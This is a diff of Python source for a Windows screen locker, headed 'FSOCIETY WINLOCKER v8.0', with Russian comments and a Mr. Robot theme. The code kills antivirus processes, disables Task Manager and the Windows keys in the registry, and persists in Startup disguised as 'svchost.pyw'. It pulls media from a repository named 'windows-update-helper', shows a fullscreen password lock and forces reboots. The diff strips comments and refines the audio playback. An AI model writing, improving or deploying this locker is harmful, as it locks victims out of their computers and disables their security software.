@@ -1,20 +1,15 @@
-# ============================================================
-# FSOCIETY WINLOCKER v8.0 — PYTHON
-# ============================================================
 import os, sys, time, threading, tempfile, ctypes, winreg, shutil, subprocess, urllib.request, tkinter as tk
 
-# АВТОУСТАНОВКА БИБЛИОТЕК
 for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keyboard"),("numpy","numpy")]:
     try: __import__(lib)
     except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
 
 import cv2, pygame, keyboard, numpy as np
 
-# КОНФИГ
 PASS = "1601"
 TRIES = 5
 HOURS = 1
-TIMER = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
+TIMER = os.path.join(tempfile.gettempdir(), "timer.dat")
 VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
 T = tempfile.gettempdir()
@@ -22,7 +17,6 @@ V = os.path.join(T, "v.mp4")
 M = os.path.join(T, "m.mp3")
 tries = TRIES
 
-# СКАЧИВАНИЕ
 def dl(url, path):
     if os.path.exists(path) and os.path.getsize(path) > 10000: return True
     try:
@@ -35,7 +29,6 @@ def dl(url, path):
     except: pass
     return False
 
-# АНТИВИРУС
 def kill_av():
     avs = ["avast","avg","avira","bitdefender","kaspersky","mcafee","norton","eset","drweb","msmpeng","nis","bdagent","avp","MsMpEng","NisSrv","Sophos","Windefend","Defender"]
     while True:
@@ -44,7 +37,6 @@ def kill_av():
             except: pass
         time.sleep(0.1)
 
-# БЛОКИРОВКА КЛАВИШ
 def lock_keys():
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
         for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
@@ -65,10 +57,8 @@ def unlock_keys():
             try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,0); winreg.CloseKey(r)
             except: pass
 
-# ТАЙМЕР
 def timer_save():
     end = time.time() + HOURS*3600
-    os.makedirs(os.path.dirname(TIMER), exist_ok=True)
     with open(TIMER,'w') as f: f.write(str(end))
     return end
 
@@ -86,7 +76,6 @@ def destroy():
     os.system("shutdown /r /t 0 /f")
     os._exit(0)
 
-# АВТОЗАГРУЗКА
 def startup():
     s = os.path.abspath(sys.argv[0])
     d = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','svchost.pyw')
@@ -100,7 +89,6 @@ def startup():
             winreg.CloseKey(r)
         except: pass
 
-# АНИМАЦИЯ
 def anim():
     a=tk.Tk(); a.attributes('-fullscreen',True); a.attributes('-topmost',True)
     a.configure(bg='black'); a.overrideredirect(True)
@@ -113,12 +101,21 @@ def anim():
         s.config(text="тебя приветствует"[:i]); a.update(); time.sleep(0.1)
     time.sleep(2); a.destroy()
 
-# ВИДЕО
 def video():
     if not dl(VIDEO_URL,V): return
+    time.sleep(0.5)
+    sound_ok = False
     try:
-        pygame.mixer.init(); pygame.mixer.music.load(V); pygame.mixer.music.play()
-    except: pass
+        pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
+        pygame.mixer.music.load(V)
+        pygame.mixer.music.set_volume(1.0)
+        pygame.mixer.music.play()
+        sound_ok = True
+    except:
+        try:
+            subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet',V], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+            sound_ok = True
+        except: pass
     try:
         cap=cv2.VideoCapture(V)
         if not cap.isOpened(): return
@@ -135,7 +132,6 @@ def video():
     try: pygame.mixer.music.stop()
     except: pass
 
-# ВИНЛОКЕР
 class Locker:
     def __init__(self):
         global tries
@@ -152,8 +148,10 @@ class Locker:
         self.tick()
         try:
             if dl(MUSIC_URL,M):
-                pygame.mixer.init(); pygame.mixer.music.load(M)
-                pygame.mixer.music.set_volume(1.0); pygame.mixer.music.play(-1)
+                pygame.mixer.init()
+                pygame.mixer.music.load(M)
+                pygame.mixer.music.set_volume(1.0)
+                pygame.mixer.music.play(-1)
         except: pass
         msg=f"""Вот чего доводит интернет.
 
